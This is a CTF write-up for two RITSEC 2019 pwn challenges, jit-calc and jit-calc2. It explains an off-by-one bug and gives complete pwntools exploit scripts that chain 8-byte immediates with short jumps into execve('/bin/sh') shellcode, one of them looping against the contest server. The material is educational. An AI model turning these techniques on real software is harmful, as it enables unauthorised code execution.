# RITSEC 2019
## Pwn
### jit-calc (495 points, 29 solved)
The bug is in the `s[strlen(input)-1]=0x0`,  which could result in an overwrite to the last entry of the offset array to 0x58 if provided `strlen(input) == 0`.

We then change index to the last entry and start writing code at offset 0x58. Using multiple writeImmediate64 instructions(10 bytes in length), we can overwrite the start of the second entry with the 8 bytes immediate value which we can control. That is, if we run the second entry, it runs the instruction we provided with that 8 bytes.

In order to get shell, I added a relative short jmp instruction, which is 2 bytes in length, after each instruction to connect the shellcode. ([Reference](https://thestarman.pcministry.com/asm/2bytejumps.htm))

For the shellcode, because PIE is closed, I used sys_read to read `/bin/sh` to writable memory and `execve(writeable_memory, ptr_to_null, NULL)` to get shell.

```python
from pwn import *
#context.log_level=  'DEBUG'
context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'
p = process('./jit-calc')
#p = remote('ctfchallenges.ritsec.club',  8000)

def debug(bps=[]):
	cmd = ''
	cmd += ''.join(['b *{:#x}\n'.format(b) for b in bps])
	cmd += 'c'
	gdb.attach(p, cmd)
	pause()

def switch_write():
	p.recv()
	p.sendline(str(2))

def write_finish():
	p.recv()
	p.sendline(str(1))

def write_constant(val):
	p.recv()
	p.sendline(str(3))
	p.recv()
	p.sendline(str(1)) # doesn't matter the register
	p.recv()
	p.sendline(val)

def change_index(index):
	p.recv()
	p.sendline(str(1))
	p.recv()
	p.sendline(str(index))

def run():
	p.recv()
	p.sendline(str(4))

def shellcode(code):
	shell = asm(code)
	offset = len(shell)+2+2+8
	offset = negate(offset,width=8)
	shell += '\xeb'
	shell += p8(offset)
	return str(u64(shell.ljust(8, '\x00')))

bps = [0x401029]
switch_write()
write_finish()

p.recv()
p.sendline('\x00')

change_index(7)
switch_write()
for i in range(91-9):
	write_constant('11111111')

'''
shellcode
'''

write_constant(shellcode('syscall'))
write_constant(shellcode('mov edx, 0'))
write_constant(shellcode('mov esi, 0x602150'))
write_constant(shellcode('mov edi, 0x602130'))
write_constant(shellcode('mov eax, 0x3b'))
write_constant(shellcode('syscall'))
write_constant(shellcode('mov edx, 7'))
write_constant(shellcode('mov esi, 0x602130'))
write_constant(shellcode('xor rdi, rdi'))
write_constant(shellcode('xor rax, rax'))

write_finish()

#debug(bps)
change_index(1)
run()
p.send('/bin/sh\x00')

p.interactive()
```

### jit-calc2 (500 points, 9 solved)
The program-flow is nearlly as the same as jit-calc, except this time the binary has PIE protection.

Rather than calling `sys_write`, I used `push ax` to push `/bin/sh\x00` on stack, same as NULL for the second parameter of `execve`

```python
from pwn import *
#context.log_level=  'DEBUG'
context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'
#p = process('./jit-calc2')

def debug(bps=[]):
	cmd = ''
	cmd += ''.join(['b *$rebase({:#x})\n'.format(b) for b in bps])
	cmd += 'c'
	gdb.attach(p, cmd)
	pause()

def switch_write():
	p.recv()
	p.sendline(str(2))

def write_finish():
	p.recv()
	p.sendline(str(1))

def write_constant(val):
	p.recv()
	p.sendline(str(3))
	p.recv()
	p.sendline(str(1)) # doesn't matter the register
	p.recv()
	p.sendline(val)

def change_index(index):
	p.recv()
	p.sendline(str(1))
	p.recv()
	p.sendline(str(index))

def run():
	p.recv()
	p.sendline(str(4))

def shellcode(code):
	shell = asm(code)
	offset = len(shell)+2+2+8
	offset = negate(offset,width=8)
	shell += '\xeb'
	shell += p8(offset)
	return str(u64(shell.ljust(8, '\x00')))

while True:
	try:
		p = remote('ctfchallenges.ritsec.club', 8083)
		switch_write()
		write_finish()

		p.recv()
		p.sendline('\x00')

		change_index(7)
		switch_write()
		for i in range(91-14):
			write_constant('11111111')

		'''
		shellcode
		'''

		write_constant(shellcode('syscall'))
		write_constant(shellcode('mov eax, 0x3b'))
		write_constant(shellcode('mov edx, 0'))
		write_constant(shellcode('mov rsi, rsp'))
		write_constant(shellcode('push 0'))
		write_constant(shellcode('mov rdi, rsp'))

		write_constant(shellcode('push ax'))
		write_constant(shellcode('mov eax, 0x622f'))
		write_constant(shellcode('push ax'))
		write_constant(shellcode('mov eax, 0x6e69'))
		write_constant(shellcode('push ax'))
		write_constant(shellcode('mov eax, 0x732f'))
		write_constant(shellcode('push ax'))
		write_constant(shellcode('mov eax, 0x0068'))
		write_constant(shellcode('xor rax, rax'))

		write_finish()

		change_index(1)
		run()

		p.interactive()
	except:
		p.close()
```

### wumb0list (500 points, 11 solved)